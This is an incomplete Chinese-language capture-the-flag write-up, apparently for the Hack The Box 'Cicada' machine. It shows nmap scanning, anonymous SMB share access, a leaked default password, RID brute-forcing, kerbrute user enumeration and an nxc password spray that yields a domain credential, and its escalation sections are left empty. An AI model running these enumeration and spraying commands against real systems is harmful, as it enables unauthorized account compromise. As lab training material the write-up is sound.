# ✔️ Cicada

## 建立立足点

### 信息收集

* 使用Nmap对目标系统进行开放端口扫描：

```bash
nmap -sC -sV -p- -oA cicada 10.129.5.101 --open
```

<figure><img src="../../.gitbook/assets/1.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/2.png" alt=""><figcaption></figcaption></figure>

* 根据Nmap的输出信息和开放端口，判断该机器应该是域控，先将域名添加进/hosts文件中：

<figure><img src="../../.gitbook/assets/3.png" alt=""><figcaption></figcaption></figure>

* 尝试使用匿名登录SMB服务，获得了一些SMB共享目录：

<figure><img src="../../.gitbook/assets/4.png" alt=""><figcaption></figcaption></figure>

* 依次枚举各个目录后，发现只有/HR目录可以进入，查看后发现一个名为Notice from HR.txt的文本文件，把它下载到本地：

```bash
smbclient \\\\10.129.5.101\\HR
dir
mget *
```

<figure><img src="../../.gitbook/assets/5.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/7.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/6.png" alt=""><figcaption></figcaption></figure>

* 查看Notice from HR.txt文件内容得知是一封录用通知，里面包含了一个新入职员工用户的默认密码：<mark style="color:red;">**Cicada$M6Corpb\*@Lp#nZp!8**</mark>

<figure><img src="../../.gitbook/assets/8.png" alt=""><figcaption></figcaption></figure>

* 使用enum4linux进行枚举，没什么收获：

```bash
enum4linux 10.129.5.101
```

<figure><img src="../../.gitbook/assets/9.png" alt=""><figcaption></figcaption></figure>

* 此时已经获取到了一个有效密码，但是还没有有效用户名，使用nxc进行暴破得到一串用户名：

```bash
nxc smb 10.129.5.101 -u "guest" -p '' --rid-brute
```

<figure><img src="../../.gitbook/assets/10.png" alt=""><figcaption></figcaption></figure>

* 把这些用户名复制下来保存为一个username.txt文件，先用kerbrute跑一下有8个有效用户名：

```bash
./kerbrute_linux_amd64 userenum --dc 10.129.5.101 -d cicada.htb username.txt
```

<figure><img src="../../.gitbook/assets/11.png" alt=""><figcaption></figcaption></figure>

### GET SHELL

* 然后再使用nxc和用户名列表，还有之前收集到的默认密码，进行暴破：

```bash
nxc smb 10.129.5.101 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

<figure><img src="../../.gitbook/assets/12.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/13.png" alt=""><figcaption></figcaption></figure>

* 已获取到了一个有效凭证：<mark style="color:red;">**michael.wrightson :Cicada$M6Corpb\*@Lp#nZp!8**</mark>
*

```bash
// Some code
```







## 权限提升

### 本地信息收集







### 漏洞利用









### ROOT









{% hint style="info" %}

{% endhint %}
